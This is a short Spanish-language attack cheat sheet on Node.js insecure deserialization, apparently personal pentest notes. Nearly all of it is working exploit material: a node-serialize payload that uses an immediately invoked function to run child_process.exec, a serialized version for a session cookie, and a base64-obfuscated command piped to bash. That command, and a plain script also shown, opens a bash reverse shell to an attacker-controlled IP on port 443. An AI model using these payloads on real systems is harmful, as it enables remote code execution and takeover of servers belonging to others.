# Deserialización insegura 

Tags: #InsecureDeserialization #NodeJs 

* [Deserialization Attack - Nodejs](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

```bash 
IIFE 'Immediately invoked function expression': Se puede ejecutar comando antes de que sea serializada la data agregando paréntesis.
```

```node
// Serializar la data 
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),   // Aqui se coloca el ()
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

```node 
// Data serializada 
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 IP_Kali',function(error, stdout, stderr) { console.log(stdout) }); }()"}


// Comando para obtener una revershell  
❯ echo IyEvYmluL2Jhc2ggCgpiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE1LzQ0MyAwPiYx | base64 -d | bash 


Notas:
	1. Si la data esta serializada se encuentra en la cookie de sesión, se debe url encodear para que funcione
	2. Crear una revershell en base64 
```

```bash 
#!/bin/bash 

bash -i >& /dev/tcp/IP/443 0>&1 
```
